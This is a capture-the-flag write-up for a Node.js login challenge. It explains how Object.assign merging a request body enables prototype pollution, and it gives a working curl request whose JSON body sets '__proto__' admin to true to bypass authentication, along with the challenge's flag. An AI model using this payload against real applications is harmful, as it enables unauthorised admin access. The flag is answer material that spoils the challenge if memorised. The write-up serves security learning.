# Bypass

I've hid the flag behind this super secure admin login prompt. Are you able to login as admin to retrieve the flag?

motherload.td.org.uit.no:8007

# Writeup

> This was removed from the CTF after a while due to bugs. But they've sent the first version which works for 1 user only so I could test it locally.

Looking at the source we get `Object.assign(user, req.body)`. This merges to the `user` object anything that is in the body. 

The script checks if `req.body.admin` is set so we cannot send it as a body. This will also require us to send the correct code which is randomized. We'll never brute that.

So to bypass that we can look at prototype pollutions. 

```js
let userAuth = Object.assign(user, req.body);
```

As long as we dont send admin as a part of the `req.body` we will get to this function. This assign all of `req.body` to the `userAuth` variable. And a bit further down if we have `userAuth.admin` or if the username/password is correct we will get the flag:

```js
if(userAuth.admin || utils.verifyUser(req.body.username, req.body.password)){
res.render("flag");
} else {
res.status(401).render("unauthorized");
}
```

But the only way to get userAuth.admin is to have the `Object.assign` put `req.body.admin` into it? But that is not allowed due to the first if check? Oh well, here comes `__proto__`. If an object does not find what it is looking for it looks inside the `__proto__` element if it has. And it returns any keys equal to the key it tries to.

So `userAuth.admin` does not exist so it looks into `userAuth.__proto__.admin`. And there we go. We just send that in the request and we should be golden.

```json
curl -s --request POST \
  --url http://10.0.0.159:8007/flag \
  --header 'Content-Type: application/json' \
  --data '{
	"__proto__": {
		"admin": true
	}
}' | grep UiTHack
```
There we have it:

```
<h4>UiTHack23{h3y_d0nt_p01s0n_my_pr07otyp3}</h4>
```
